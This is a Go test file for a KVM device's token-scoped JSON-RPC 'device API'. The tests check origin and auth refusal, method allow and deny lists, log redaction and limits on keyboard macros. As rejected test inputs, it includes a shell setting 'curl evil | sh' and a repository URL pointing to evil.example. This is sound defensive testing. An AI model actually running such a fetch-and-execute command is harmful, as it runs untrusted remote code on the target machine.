package kvm

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/jetkvm/kvm/internal/osservices"
	"github.com/jetkvm/kvm/internal/osservices/ffs"
	"github.com/rs/zerolog"
	"golang.org/x/crypto/bcrypt"
)

// setupDeviceAPITest returns a caller and a device-scope token. auth is
// "token" for that token, "pw" for the password as basic auth (refused), or ""
// for none.
func setupDeviceAPITest(t *testing.T, enabled bool) func(body, contentType, origin, auth string) *httptest.ResponseRecorder {
	t.Helper()
	hash, err := bcrypt.GenerateFromPassword([]byte("pw"), bcrypt.MinCost)
	if err != nil {
		t.Fatal(err)
	}
	previousConfig := config
	previousLimiter := passwordRateLimiter
	previousPath := configPath
	config = &Config{LocalAuthMode: "password", HashedPassword: string(hash), DeviceAPIEnabled: enabled}
	configPath = t.TempDir() + "/kvm_config.json"
	passwordRateLimiter = NewRateLimiter()
	t.Cleanup(func() {
		passwordRateLimiter.Stop()
		passwordRateLimiter = previousLimiter
		config = previousConfig
		configPath = previousPath
	})
	created, err := rpcCreateAPIToken("test", []string{APIScopeDevice}, 0)
	if err != nil {
		t.Fatal(err)
	}
	router := setupRouter()
	return func(body, contentType, origin, auth string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(http.MethodPost, deviceAPIPath, strings.NewReader(body))
		if contentType != "" {
			req.Header.Set("Content-Type", contentType)
		}
		if origin != "" {
			req.Header.Set("Origin", origin)
		}
		switch auth {
		case "token":
			req.Header.Set("Authorization", "Bearer "+created.Token)
		case "pw":
			req.SetBasicAuth("", "pw")
		}
		rec := httptest.NewRecorder()
		router.ServeHTTP(rec, req)
		return rec
	}
}

// useTestOSServices installs an OS Services service with no sender, as
// initOSServices builds it without the key, the USB function and the loops.
func useTestOSServices(t *testing.T) *osServicesService {
	t.Helper()
	s := &osServicesService{
		start:          time.Now(),
		stateSignal:    make(chan struct{}, 1),
		clipboardWaits: map[uint32]chan clipboardResult{},
		terminals:      map[uint32]*guestTerminal{},
		drops:          map[uint32]*guestDrop{},
	}
	s.video.init(s)
	s.hostInfo.init()
	s.link = ffs.NewLink(osServicesLogger, "")
	s.session = osservices.New(s, s.config().sessionSettings(osservices.CodecH264))
	s.link.SetSession(s.session)
	previous := osServices
	osServices = s
	t.Cleanup(func() { osServices = previous })
	return s
}

func TestDeviceAPIIsOffByDefault(t *testing.T) {
	call := setupDeviceAPITest(t, false)
	rec := call(`{"jsonrpc":"2.0","id":1,"method":"ping"}`, "application/json", "", "token")
	if rec.Code != http.StatusForbidden || !strings.Contains(rec.Body.String(), deviceAPIOff) {
		t.Fatalf("off: %d %s", rec.Code, rec.Body)
	}
}

func TestDeviceAPIRefusesWhatABrowserPageCouldSend(t *testing.T) {
	call := setupDeviceAPITest(t, true)
	ping := `{"jsonrpc":"2.0","id":1,"method":"ping"}`
	if rec := call(ping, "application/json", "", ""); rec.Code != http.StatusUnauthorized {
		t.Fatalf("no token: %d", rec.Code)
	}
	if rec := call(ping, "application/json", "", "pw"); rec.Code != http.StatusUnauthorized {
		t.Fatalf("the password instead of a token: %d", rec.Code)
	}
	if rec := call(ping, "text/plain", "", "token"); rec.Code != http.StatusUnsupportedMediaType {
		t.Fatalf("text/plain: %d", rec.Code)
	}
	if rec := call(ping, "application/json", "http://evil.example", "token"); rec.Code != http.StatusForbidden {
		t.Fatalf("other origin: %d", rec.Code)
	}
	if rec := call(ping, "application/json", "http://example.com", "token"); rec.Code != http.StatusOK {
		t.Fatalf("same origin: %d %s", rec.Code, rec.Body)
	}
}

func TestDeviceAPIRunsOnlyAllowedMethods(t *testing.T) {
	call := setupDeviceAPITest(t, true)
	useTestOSServices(t)
	rec := call(`[{"jsonrpc":"2.0","id":1,"method":"ping"},
		{"jsonrpc":"2.0","id":2,"method":"factoryReset"},
		{"jsonrpc":"2.0","id":3,"method":"setDeviceAPIEnabled","params":{"enabled":false}},
		{"jsonrpc":"2.0","id":4,"method":"executeKeyboardMacro","params":{"steps":[{"keys":[1,2,3,4,5,6,7]}]}},
		{"jsonrpc":"2.0","id":5,"method":"getDeviceID"},
		{"jsonrpc":"2.0","id":6,"method":"setOsServicesSettings","params":{"settings":{"terminal_api_enabled":true}}},
		{"jsonrpc":"2.0","id":7,"method":"createAPIToken","params":{"name":"x","scopes":["terminal"],"expiresInDays":0}}]`, "application/json", "", "token")
	if rec.Code != http.StatusOK {
		t.Fatalf("batch: %d %s", rec.Code, rec.Body)
	}
	var responses []struct {
		ID     int             `json:"id"`
		Result json.RawMessage `json:"result"`
		Error  *struct {
			Code int    `json:"code"`
			Data string `json:"data"`
		} `json:"error"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &responses); err != nil || len(responses) != 7 {
		t.Fatalf("batch answer %s: %v", rec.Body, err)
	}
	if string(responses[0].Result) != `"pong"` {
		t.Errorf("ping: %s", responses[0].Result)
	}
	for _, i := range []int{1, 2} {
		if responses[i].Error == nil || responses[i].Error.Code != -32601 {
			t.Errorf("request %d must be refused as not found", responses[i].ID)
		}
	}
	if e := responses[3].Error; e == nil || !strings.Contains(e.Data, "at most 6") {
		t.Errorf("seven keys in a step must be refused: %+v", e)
	}
	if responses[4].ID != 5 || responses[4].Error != nil {
		t.Errorf("getDeviceID: %+v", responses[4])
	}
	if e := responses[5].Error; e == nil || !strings.Contains(e.Data, "cannot change terminal_api_enabled") {
		t.Errorf("the device API must not switch the Terminal API on: %+v", e)
	}
	if e := responses[6].Error; e == nil || e.Code != -32601 {
		t.Errorf("the device API must not create tokens: %+v", e)
	}
	if len(config.APITokens) != 1 {
		t.Errorf("tokens: %d", len(config.APITokens))
	}
	if !config.DeviceAPIEnabled {
		t.Fatal("the device API must not switch itself off")
	}
}

// A device token may change only the harmless OS Services settings: the others
// are typed into the target shell, point updates elsewhere or are switches.
func TestDeviceAPISetOsServicesSettingsAllowList(t *testing.T) {
	call := setupDeviceAPITest(t, true)
	useTestOSServices(t)
	set := func(settings string) string {
		rec := call(`{"jsonrpc":"2.0","id":1,"method":"setOsServicesSettings","params":{"settings":`+settings+`}}`,
			"application/json", "", "token")
		return rec.Body.String()
	}
	before := *defaultOSServicesConfig()
	for _, settings := range []string{
		`{"terminal_shell_command":"curl evil | sh"}`, `{"terminal_mux_start":"tmux"}`,
		`{"repository_url":"https://evil.example/"}`,
		fmt.Sprintf(`{"enabled":%v}`, !before.Enabled),
		fmt.Sprintf(`{"terminal_api_enabled":%v}`, !before.TerminalAPIEnabled),
		fmt.Sprintf(`{"video_enabled":%v,"files_enabled":%v}`, !before.VideoEnabled, !before.FilesEnabled),
	} {
		if body := set(settings); !strings.Contains(body, "the device API cannot change") {
			t.Errorf("%s: %s", settings, body)
		}
		if config.OSServices != nil && *config.OSServices != before {
			t.Fatalf("%s changed the settings: %+v", settings, *config.OSServices)
		}
	}
	want := !before.VideoEnabled
	if body := set(fmt.Sprintf(`{"video_enabled":%v,"enabled":%v}`, want, before.Enabled)); strings.Contains(body, "error") {
		t.Fatalf("video_enabled with an unchanged switch: %s", body)
	}
	if config.OSServices == nil || config.OSServices.VideoEnabled != want {
		t.Fatal("video_enabled was not saved")
	}
}

// The plain log line of a device API call shows no typed keys, clipboard text
// or URL.
func TestDeviceAPIDoesNotLogParams(t *testing.T) {
	call := setupDeviceAPITest(t, true)
	var buf bytes.Buffer
	previous := jsonRpcLogger
	captured := zerolog.New(&buf).Level(zerolog.InfoLevel)
	jsonRpcLogger = &captured
	t.Cleanup(func() { jsonRpcLogger = previous })
	call(`[{"jsonrpc":"2.0","id":1,"method":"executeKeyboardMacro","params":{"steps":[{"keys":[1,2,3,4,5,6,7],"delay":4242}]}},
		{"jsonrpc":"2.0","id":2,"method":"guestClipboardSet","params":{"text":"hunter2"}}]`,
		"application/json", "", "token")
	out := buf.String()
	if !strings.Contains(out, "guestClipboardSet") {
		t.Fatalf("nothing logged: %s", out)
	}
	for _, secret := range []string{"4242", "hunter2"} {
		if strings.Contains(out, secret) {
			t.Errorf("the log holds %q: %s", secret, out)
		}
	}
}

func TestDeviceAPIMethodsExist(t *testing.T) {
	for method := range deviceAPIMethods {
		if _, ok := rpcHandlers[method]; !ok {
			t.Errorf("%s is allowed but is not an RPC method", method)
		}
	}
	for _, denied := range []string{"factoryReset", "setNetworkSettings", "setLocalLoopbackOnly", "setTLSState",
		"setSSHKeyState", "setDevModeState", "tryUpdate", "deregisterDevice", "setCloudUrl", "setDeviceAPIEnabled",
		"getAPITokens", "createAPIToken", "deleteAPIToken"} {
		if _, ok := deviceAPIHandler(denied); ok {
			t.Errorf("%s must not run through the device API", denied)
		}
	}
}

// Typing through the device API holds the keyboard for at most 10 minutes.
func TestDeviceAPIMacroDelayIsBounded(t *testing.T) {
	steps := make([]any, 121)
	for i := range steps {
		steps[i] = map[string]any{"keys": []any{4.0}, "delay": 5000.0}
	}
	if err := apiExecuteKeyboardMacro(steps); err == nil || !strings.Contains(err.Error(), "10 minutes") {
		t.Fatalf("121 steps of 5 s: %v", err)
	}
}

// A device API client that goes away stops its typing.
func TestDeviceAPIMacroEndsWithItsRequest(t *testing.T) {
	setupDeviceAPITest(t, true)
	defer cancelKeyboardMacro()
	ctx, cancel := context.WithCancel(context.Background())
	c, _ := gin.CreateTestContext(httptest.NewRecorder())
	c.Request = httptest.NewRequest(http.MethodPost, deviceAPIPath, nil).WithContext(ctx)
	done := make(chan JSONRPCResponse, 1)
	go func() {
		done <- deviceAPICallLogged(c, []byte(`{"jsonrpc":"2.0","id":1,"method":"executeKeyboardMacro","params":{"steps":[{"keys":[4],"delay":5000}]}}`), "test")
	}()
	waitForRegisteredMacro(t)
	cancel()
	select {
	case response := <-done:
		if response.Error == nil {
			t.Fatal("canceled typing reported success")
		}
	case <-time.After(2 * time.Second):
		t.Fatal("typing went on after the client left")
	}
}
